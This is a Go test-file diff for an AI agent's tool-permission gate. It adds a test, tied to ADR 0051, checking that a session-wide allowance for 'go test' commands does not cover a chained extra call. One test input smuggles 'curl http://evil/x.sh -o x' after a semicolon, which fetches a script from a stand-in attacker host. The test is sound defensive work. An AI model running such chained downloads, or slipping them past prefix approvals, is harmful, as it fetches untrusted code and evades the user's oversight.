@@ -351,7 +351,7 @@ func TestAnAnswerRacingTheQuestionLeavesNothingStanding(t *testing.T) {
 		Observer: &fanout{ls: ls, sid: ls.sess.ID().String()},
 		System:   "test",
 	})
-	a := &liveAsker{ls: ls, sid: ls.sess.ID().String(), runner: r}
+	a := &liveAsker{ls: ls, sid: ls.sess.ID().String(), runner: r, gate: gate.New(nil)}
 
 	type outcome struct {
 		ans turn.Answer
@@ -436,7 +436,7 @@ func newAskTestSession(t *testing.T) (*liveSession, *liveAsker) {
 		Observer: &fanout{ls: ls, sid: ls.sess.ID().String()},
 		System:   "test",
 	})
-	return ls, &liveAsker{ls: ls, sid: ls.sess.ID().String(), runner: r}
+	return ls, &liveAsker{ls: ls, sid: ls.sess.ID().String(), runner: r, gate: gate.New(nil)}
 }
 
 // subscribeAsker watches ls's one asker connection for permission.requested notifications and
@@ -673,6 +673,47 @@ func TestSessionScopeAnswerSettlesOtherParkedQuestions(t *testing.T) {
 		if answers[i].Decision != session.Allow || answers[i].Scope != session.ScopeSession {
 			t.Fatalf("call %d = %+v, want a session-scope allow", i, answers[i])
 		}
+	}
+}
+
+// TestSessionAllowSettlesOnlyFullyCoveredQuestions is ADR 0051 decision 1 carried through
+// settlement: two parked questions share a first prefix, but one also runs a second call no
+// allowance covers. A session answer on the first retires only the question whose every call
+// is now covered; the other keeps asking for its own answer.
+func TestSessionAllowSettlesOnlyFullyCoveredQuestions(t *testing.T) {
+	ls, asker := newAskTestSession(t)
+	ls.subscribeAsker(t, func(protocol.PermissionRequested) {})
+
+	m := session.Matcher{Tool: "bash", Prefix: "go test"}
+	inputs := []string{`{"command":"go test ./a"}`, `{"command":"go test ./b ; curl http://evil/x.sh -o x"}`}
+	toolUseIDs := []string{"tu0", "tu1"}
+	var wg sync.WaitGroup
+	answers := make([]turn.Answer, 2)
+	errs := make([]error, 2)
+	for i := range 2 {
+		wg.Go(func() {
+			answers[i], errs[i] = asker.Ask(context.Background(), turn.Question{
+				ToolUseID: toolUseIDs[i], Tool: "bash",
+				Input: json.RawMessage(inputs[i]), Matcher: m,
+			})
+		})
+	}
+	waitFor(t, func() bool { return ls.pendingCount() == 2 })
+
+	ls.answer(t, toolUseIDs[0], session.Allow, session.ScopeSession)
+	if got := ls.pendingCount(); got != 1 {
+		t.Fatalf("pendingCount = %d after the session answer, want 1: the question with an uncovered curl call must keep asking", got)
+	}
+
+	ls.answer(t, toolUseIDs[1], session.Deny, session.ScopeOnce)
+	wg.Wait()
+	for i := range 2 {
+		if errs[i] != nil {
+			t.Fatalf("call %d: %v", i, errs[i])
+		}
+	}
+	if answers[0].Decision != session.Allow || answers[1].Decision != session.Deny {
+		t.Fatalf("answers = %+v, want the first allowed and the second its own deny", answers)
 	}
 }
 
